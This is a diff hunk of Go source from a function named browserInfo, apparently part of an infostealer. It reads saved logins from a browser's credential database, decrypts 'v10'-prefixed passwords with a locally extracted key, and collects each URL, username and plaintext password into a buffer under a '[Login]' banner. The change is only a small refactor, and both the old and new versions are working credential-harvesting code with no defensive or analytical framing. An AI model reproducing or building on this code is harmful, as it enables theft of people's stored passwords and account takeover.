@@ -261,10 +261,10 @@ func browserInfo() {
 			defer rows.Close()
 
 			for rows.Next() {
-				var url, username, encryptedPassword string
-				rows.Scan(&url, &username, &encryptedPassword)
-				if strings.HasPrefix(encryptedPassword, "v10") {
-					password := decryptData([]byte(strings.TrimPrefix(encryptedPassword, "v10")), extractKey(localPath))
+				var url, username, password string
+				rows.Scan(&url, &username, &password)
+				if strings.HasPrefix(password, "v10") {
+					password = decryptData([]byte(password[3:]), extractKey(localPath))
 					if password != "" {
 						DATA.WriteString(fmt.Sprintf("==========================[Login]=============================\nURL: %v\nUSERNAME: %v\nPASSWORD: %v\n\n", url, username, password))
 					}
